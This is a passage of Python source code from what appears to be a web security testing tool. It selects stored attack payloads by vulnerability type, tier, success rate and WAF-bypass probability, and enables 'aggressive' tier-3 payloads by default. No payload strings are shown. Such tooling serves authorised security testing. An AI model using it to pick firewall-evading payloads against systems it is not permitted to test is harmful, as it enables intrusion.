                    max_false_positive: float = 1.0) -> List[CuratedPayload]:
        """
        Get curated payloads with filters.
        
        Args:
            vuln_type: Filter by vulnerability type
            tier: Payload tier (default: TIER_1)
            min_success_rate: Minimum success rate
            min_waf_bypass: Minimum WAF bypass probability
            max_false_positive: Maximum false positive rate
            
        Returns:
            List of CuratedPayload objects
        """
        results = []
        
        # Select vulnerability types to search
        types_to_search = [vuln_type] if vuln_type else list(self.payloads.keys())
        
        for vtype in types_to_search:
            for payload in self.payloads[vtype]:
                # Apply tier filter
                if payload.tier != tier:
                    continue
                
                # Apply quality filters
                if payload.success_rate < min_success_rate:
                    continue
                if payload.waf_bypass_prob < min_waf_bypass:
                    continue
                if payload.false_positive_rate > max_false_positive:
                    continue
                
                results.append(payload)
        
        # Sort by quality score
        results.sort(key=lambda p: p.get_quality_score(), reverse=True)
        
        return results
    
    def get_payload_strings(self, **kwargs) -> List[str]:
        """Get payload strings (convenience method)."""
        payloads = self.get_payloads(**kwargs)
        return [p.content for p in payloads]
    
    def get_total_count(self, tier: Optional[PayloadTier] = None) -> int:
        """Get total payload count, optionally filtered by tier."""
        count = 0
        for vuln_payloads in self.payloads.values():
            if tier:
                count += sum(1 for p in vuln_payloads if p.tier == tier)
            else:
                count += len(vuln_payloads)
        return count
    
    def get_stats(self) -> Dict:
        """Get payload statistics."""
        stats = {
            'total': self.get_total_count(),
            'tier_1': self.get_total_count(PayloadTier.TIER_1),
            'tier_2': self.get_total_count(PayloadTier.TIER_2),
            'tier_3': self.get_total_count(PayloadTier.TIER_3),
            'by_type': {}
        }
        
        for vtype in VulnType:
            stats['by_type'][vtype.value] = len(self.payloads[vtype])
        
        return stats


# Global instance (with TIER 3 enabled for full coverage)
_global_curated_db = None

def get_curated_payload_db(enable_tier3: bool = True) -> CuratedPayloadDatabase:
    """
    Get global curated payload database instance.
    
    Args:
        enable_tier3: Enable TIER 3 aggressive payloads (default: True for full coverage)
    """
    global _global_curated_db
    if _global_curated_db is None:
        _global_curated_db = CuratedPayloadDatabase(enable_tier3=enable_tier3)
    return _global_curated_db


# Alias for compatibility
CuratedPayloadManager = CuratedPayloadDatabase